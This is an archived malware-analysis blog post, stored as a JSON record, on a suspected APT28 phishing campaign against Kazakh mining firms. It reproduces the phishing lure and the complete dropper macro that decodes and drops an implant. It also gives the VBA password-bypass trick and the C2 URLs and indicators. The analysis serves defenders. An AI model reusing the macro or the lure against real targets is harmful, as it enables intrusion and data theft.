{
    "id": "313af56e-afe6-49a0-826f-fd9ef0c49663",
    "created_at": "2023-01-12T15:06:28.508699Z",
    "updated_at": "2025-03-27T02:17:11.850061Z",
    "deleted_at": null,
    "sha1_hash": "81cbc057c7c897193ad4f51b149892f28990522d",
    "title": "2019-10-24 - 10-24-2019 - APT28- Targeted attacks against mining corporations in Kazakhstan",
    "authors": "",
    "file_creation_date": "2022-05-28T15:54:03Z",
    "file_modification_date": "2022-05-28T15:54:03Z",
    "file_size": 2326150,
    "plain_text": "# 10/24/2019 - APT28: Targeted attacks against mining corporations in Kazakhstan\n\n**meltx0r.github.io/tech/2019/10/24/apt28.html**\n\nMELTX0R October 24, 2019\n\n## Summary\n\n[APT28 (also commonly known as FancyBear, STRONTIUM, Sednit, Sofacy, and more) is a](https://attack.mitre.org/groups/G0007/)\nthreat group that has been attributed to Russia’s Main Intelligence Directorate of the Russian\nGeneral Staff by a July 2018 U.S. Department of Justice indictment. The group has been\nregarded as being active since at least 2004, and is espionage motivated. It’s targets have\nincluded the private sector, military, and governments across the world. In this post, I will\nreview a campaign that I believe to have been conducted by APT28.\n\n## Analysis\n\nWhile performing research, I came across an interesting document titled\n_“gorodpavlodar.doc”. This document was an attachment within an equally as interesting_\nemail - this email was sent to multiple individuals who, as far as my research indicates, work\nfor a large mining corporation with operations located in Kazakhstan. The email purports to\nbe sent from the “OFFICIAL RESOURCE OF THE CITY OF PAVLODAR”, but is actually sent\nby the address “pavlodar.news@bk.ru”. Pavlodar is a city in northeastern Kazakhstan and\nthe capital of the Pavlodar Region. The original email and translation are listed below, which\nprompts the recipient of the email to review the attached document.\n\n_ORIGINAL (RUSSIAN):_\n\n\n-----\n\n```\nFrom: ОФИЦИАЛЬНЫЙ РЕСУРС ГОРОДА ПАВЛОДАР [pavlodar.news@bk.ru]\nSubject: ГРАФИК ПОДКЛЮЧЕНИЯ ВАШЕГО ЖИЛОГО ДОМА К ГОРЯЧЕМУ ВОДОСНАБЖЕНИЮ\nНа сегодняшний день без горячего водоснабжения остаются 240 многоэтажных жилых домов,\nпередаёт корреспондент pavlodarnews.kz.\nС 13 по 19 мая ТОО «Павлодарские тепловые сети» проводило гидравлические испытания на\nинженерных сетях теплоснабжения в северной части города. Было выявлено 84\nповреждения, в\nсвязи с чем на сегодняшний день без ГВС остаются 240 многоэтажных жилых домов.\nС графиком подключения жилых домов к горячему водоснабжению вы можете ознакомится во\nвложении, прикрепленному к письму.\n________________________________\nОФИЦИАЛЬНЫЙ ИНТЕРНЕТ-РЕСУРС АКИМАТА ГОРОДА ПАВЛОДАР\n\n```\n_TRANSLATION:_\n```\nFrom: OFFICIAL RESOURCE OF PAVLODAR CITY [pavlodar.news@bk.ru]\nSubject: SCHEDULE OF CONNECTING YOUR RESIDENTIAL HOUSE TO HOT WATER SUPPLY\nTo date, 240 multi-storey residential buildings remain without hot water,\nreports correspondent pavlodarnews.kz.\nFrom May 13 to 19, Pavlodar Heating Networks LLP conducted hydraulic tests on\nheat supply engineering networks in the northern part of the city. 84 injuries were\nidentified, in\nIn connection with this, 240 multi-storey residential buildings remain without hot\nwater supply.\nYou can familiarize yourself with the schedule for connecting residential buildings\nto hot water in\nattachment attached to the letter.\n________________________________\nOFFICIAL INTERNET RESOURCE OF AKIMAT CITY PAVLODAR\n\n```\nThe attached document also contained text written in Russian, which translated roughly to\n_“Schedule of connecting your residential house to hot water supply” and purported to be from_\nthe “Official Internet Resource of Akimat City Pavlodar”. The document appeared to be a\n\n\n-----\n\nform for the recipients to fill out with their address, date of water elimination, and reason for\nlack of hot water. It also prompts the recipient to enable Editing/Content to view the\n“protected” document.\n\nShown above: Suspected APT28 Lure “gorodpavlodar.doc”\n\nOpening the Visual Basic console via the developer tab in Word reveals a password\nprotected project that would be run if content were enabled. To bypass this password\nrestriction, I opened the document within a Hex editor and searched for the string “DPB=”\nwhich contains the VBA password, and changed it to “DPx=”. Opening the project following\nthis causes Word to throw multiple errors regarding the invalid key (DPx), but allows me to\n\n\n-----\n\nbypass the password restriction. This allows me to view the contents of the project, displayed\nbelow, which looks to be a UserForm containing quite a lot of data in two of the input boxes,\nin addition to some labels.\n\nShown above: Suspected APT28 Lure VBA Project\n\nIf I extract the embedded macro, I can see that it essentially does two things - create two\nfiles (graphic.doc and libssl.exe) from the code embedded within the VBA project, and drops\nthose files in the “C:\\Users\\[username]\\AppData\\Roaming\" directory.\n\n\n-----\n\n```\nPrivate Sub Document_Open()\nOn Error Resume Next\nDim ds As String: ds = Environ(\"APPDATA\") & \"\\graphic.doc\"\nDim dd As String: dd = Environ(\"APPDATA\") & tyihkcjfghkvb.dvxdcxxv.Caption &\ntyihkcjfghkvb.Label1.Caption & tyihkcjfghkvb.Label2.Caption\nvbnbnm dd, drgvfdhre(tyihkcjfghkvb.dxvgfchftbxfh.Value)\nvbnbnm ds, drgvfdhre(tyihkcjfghkvb.Text.Value)\nSet qw = CreateObject(\"Word.Application\")\nqw.Visible = True\nSet ww = qw.Documents.Open(ds)\nApplication.Quit SaveChanges:=wdDoNotSaveChanges\nEnd Sub\nPrivate Function drgvfdhre(tyruyt)\n Dim fghfhggjj, asddf\n Set fghfhggjj = CreateObject(\"Microsoft.XMLDOM\")\n Set asddf = fghfhggjj.createElement(\"tmp\")\n asddf.dataType = \"bin.base64\"\n asddf.Text = tyruyt\n drgvfdhre = asddf.nodeTypedValue\nEnd Function\nPrivate Sub vbnbnm(tgbyh, edcrf)\n Dim qsxx\n Set qsxx = CreateObject(\"ADODB.Stream\")\n qsxx.Type = 1\n qsxx.Open\n qsxx.Write edcrf\n qsxx.SaveToFile tgbyh, 2\nEnd Sub\n\n```\nShown above: Macro within gorodpavlodar.doc\n\nFollowing execution of the macro, the original document is deleted and the secondary\ndocument “graphic.doc” is opened. This document appears to be a “completed” version of\nthe form contained within the original document, and also contains an embedded macro that\nexecutes the aforementioned executable “libssl.exe”.\n\n\n-----\n\nShown above: graphic.doc\n\nFollowing execution of “libssl.exe”, it will modify the registry to maintain persistence\n_(HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run). It will then_\ninitiate Command & Control communications to two hard-coded URL’s via HTTP POST\nrequests - www.gorodpavlodar.kz/modules/Contact/Includes/1c.php and\n_www.gorodpavlodar.kz/modules/Contact/Includes/2c.php, along with a hard-coded User-_\nAgent string “Mozilla/5.0 (Windows NT 10.0; Win64; x64)”. The information POST’d includes\nURL encoded host information - such as a unique ID, drive information, hostname, OS,\nusername, bios, date, process listing, and more. In the past, these POST requests would\nreceive binary data in the server responses, but they are now being met with 404 HTTP\nresponses.\n\n\n-----\n\nShown above: Suspected Zebrocy Implant C2 network capture\n\nWhile I will leave the in-depth malware analysis to those more adept, the observed activity\nrelated to the binary up to this point is very reminiscent of APT28’s “Zebrocy” implant.\nFurthermore, static analysis of the binary reveals numerous similarities to other documented\n[Zebrocy samples - particularly the one documented here by Vitali Kremez. While this isn’t](https://www.vkremez.com/2019/01/lets-learn-overanalyzing-one-of-latest.html)\nconclusive evidence that APT28 is responsible for this sample, the similarities between it and\nother confirmed Zebrocy implants, in addition to the fact that Kazakhstan has historically\nbeen targeted by APT28, is quite suspect. Regardless, it was an interesting sample to review\nand gives insight into potential economic espionage activities.\n\n## Indicators\n\nIndicator Type Description\n\n27e9247d28598207794424eeb5ea4b1b MD5 libssl.exe - Suspected Zebrocy\nImplant\n\na863c2944581bc734619bf8d6ab1aef8 MD5 gorodpavlodar.doc - Suspected\nZebrocy dropper document\n\n57c2b46c7f2ad9aba80e4b6248f9367a MD5 graphic.doc\n\n/modules/Contact/Includes/1c.php URI Suspected Zebrocy Implant C2 URI\nPattern\n\n/modules/Contact/Includes/2c.php URI Suspected Zebrocy Implant C2 URI\nPattern\n\n\npavlodar.news@bk.ru Email\nAddress\n\n\nEmail Address used in suspected\nAPT28 campaign\n\n\n-----\n\n## References/Further Reading\n\n1. https://www.vkremez.com/2019/01/lets-learn-overanalyzing-one-of-latest.html\n2. https://attack.mitre.org/groups/G0007/\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2019/2019-10-24 - 10-24-2019 - APT28- Targeted attacks against mining corporations in Kazakhstan.pdf"
    ],
    "report_names": [
        "2019-10-24 - 10-24-2019 - APT28- Targeted attacks against mining corporations in Kazakhstan.pdf"
    ],
    "threat_actors": [
        {
            "id": "e3767160-695d-4360-8b2e-d5274db3f7cd",
            "created_at": "2022-10-25T16:47:55.914348Z",
            "updated_at": "2025-03-27T02:05:17.411172Z",
            "deleted_at": null,
            "main_name": "IRON TWILIGHT",
            "aliases": [
                "ATK5 ",
                "Blue Athena ",
                "BlueDelta ",
                "FROZENLAKE ",
                "Fancy Bear ",
                "Fighting Ursa ",
                "Forest Blizzard ",
                "GRAPHITE ",
                "Group 74 ",
                "PawnStorm ",
                "STRONTIUM ",
                "Sednit ",
                "Snakemackerel ",
                "Sofacy ",
                "TG-4127 ",
                "Tsar Team ",
                "APT28 "
            ],
            "source_name": "Secureworks:IRON TWILIGHT",
            "tools": [
                " Downdelph",
                " Drovorub",
                " EVILTOSS",
                " HIDEDRV",
                " Headlace",
                " LoJack",
                " Powershell Empire",
                " SCONATO",
                " SEDUPLOADER",
                " SHARPFRONT",
                " Scaramouche",
                " Sedkit Exploit Kit",
                " Sofacy downloader",
                " X-Agent",
                " X-Tunnel",
                " Zebrocy",
                " reGeorg",
                "DEALERSCHOICE"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "730dfa6e-572d-473c-9267-ea1597d1a42b",
            "created_at": "2023-01-06T13:46:38.389985Z",
            "updated_at": "2025-03-27T02:00:02.821388Z",
            "deleted_at": null,
            "main_name": "APT28",
            "aliases": [
                "FROZENLAKE",
                "BlueDelta",
                "SNAKEMACKEREL",
                "TG-4127",
                "ITG05",
                "TA422",
                "Fancy Bear",
                "FANCY BEAR",
                "Sednit",
                "IRON TWILIGHT",
                "G0007",
                "Sofacy",
                "Forest Blizzard",
                "GruesomeLarch",
                "Pawn Storm",
                "Tsar Team",
                "STRONTIUM",
                "ATK5",
                "Blue Athena",
                "APT-C-20",
                "Group 74",
                "SIG40",
                "Grizzly Steppe",
                "Fighting Ursa",
                "T-APT-12",
                "UAC-0028"
            ],
            "source_name": "MISPGALAXY:APT28",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "ae320ed7-9a63-42ed-944b-44ada7313495",
            "created_at": "2022-10-25T15:50:23.671663Z",
            "updated_at": "2025-03-27T02:00:55.518748Z",
            "deleted_at": null,
            "main_name": "APT28",
            "aliases": [
                "APT28",
                "IRON TWILIGHT",
                "SNAKEMACKEREL",
                "Group 74",
                "Sednit",
                "Sofacy",
                "Pawn Storm",
                "Fancy Bear",
                "STRONTIUM",
                "Tsar Team",
                "Threat Group-4127",
                "TG-4127",
                "Forest Blizzard",
                "FROZENLAKE"
            ],
            "source_name": "MITRE:APT28",
            "tools": [
                "Wevtutil",
                "certutil",
                "Forfiles",
                "DealersChoice",
                "Mimikatz",
                "ADVSTORESHELL",
                "Komplex",
                "HIDEDRV",
                "JHUHUGIT",
                "Koadic",
                "Winexe",
                "XTunnel",
                "Drovorub",
                "CORESHELL",
                "OLDBAIT",
                "Downdelph",
                "XAgentOSX",
                "USBStealer",
                "Zebrocy",
                "Fysbis",
                "LoJax"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "d2516b8e-e74f-490d-8a15-43ad6763c7ab",
            "created_at": "2022-10-25T16:07:24.212584Z",
            "updated_at": "2025-03-27T02:02:10.141001Z",
            "deleted_at": null,
            "main_name": "Sofacy",
            "aliases": [
                "APT 28",
                "ATK 5",
                "Blue Athena",
                "BlueDelta",
                "FROZENLAKE",
                "Fancy Bear",
                "Fighting Ursa",
                "Forest Blizzard",
                "Grey-Cloud",
                "Grizzly Steppe",
                "Group 74",
                "GruesomeLarch",
                "ITG05",
                "Iron Twilight",
                "Operation DealersChoice",
                "Operation Dear Joohn",
                "Operation Komplex",
                "Operation Pawn Storm",
                "Operation Russian Doll",
                "Operation Steal-It",
                "Pawn Storm",
                "SIG40",
                "Sednit",
                "Snakemackerel",
                "Sofacy",
                "Strontium",
                "T-APT-12",
                "TA422",
                "TAG-0700",
                "TAG-110",
                "TG-4127",
                "Tsar Team",
                "UAC-0028",
                "UAC-0063"
            ],
            "source_name": "ETDA:Sofacy",
            "tools": [
                "ADVSTORESHELL",
                "AZZY",
                "Backdoor.SofacyX",
                "CHERRYSPY",
                "CORESHELL",
                "Carberp",
                "Computrace",
                "DealersChoice",
                "Delphacy",
                "Downdelph",
                "Downrage",
                "Drovorub",
                "EVILTOSS",
                "Foozer",
                "GAMEFISH",
                "GooseEgg",
                "Graphite",
                "HATVIBE",
                "HIDEDRV",
                "Headlace",
                "Impacket",
                "JHUHUGIT",
                "JKEYSKW",
                "Koadic",
                "Komplex",
                "LOLBAS",
                "LOLBins",
                "Living off the Land",
                "LoJack",
                "LoJax",
                "MASEPIE",
                "Mimikatz",
                "NETUI",
                "Nimcy",
                "OCEANMAP",
                "OLDBAIT",
                "PocoDown",
                "PocoDownloader",
                "Popr-d30",
                "ProcDump",
                "PythocyDbg",
                "SMBExec",
                "SOURFACE",
                "SPLM",
                "STEELHOOK",
                "Sasfis",
                "Sedkit",
                "Sednit",
                "Sedreco",
                "Seduploader",
                "Shunnael",
                "SkinnyBoy",
                "Sofacy",
                "SofacyCarberp",
                "SpiderLabs Responder",
                "Trojan.Shunnael",
                "Trojan.Sofacy",
                "USB Stealer",
                "USBStealer",
                "VPNFilter",
                "Win32/USBStealer",
                "WinIDS",
                "Winexe",
                "X-Agent",
                "X-Tunnel",
                "XAPS",
                "XTunnel",
                "Xagent",
                "Zebrocy",
                "Zekapab",
                "carberplike",
                "certutil",
                "certutil.exe",
                "fysbis",
                "webhp"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673535988,
    "ts_updated_at": 1743041831,
    "ts_creation_date": 1653753243,
    "ts_modification_date": 1653753243,
    "files": {
        "pdf": "https://archive.orkl.eu/81cbc057c7c897193ad4f51b149892f28990522d.pdf",
        "text": "https://archive.orkl.eu/81cbc057c7c897193ad4f51b149892f28990522d.txt",
        "img": "https://archive.orkl.eu/81cbc057c7c897193ad4f51b149892f28990522d.jpg"
    }
}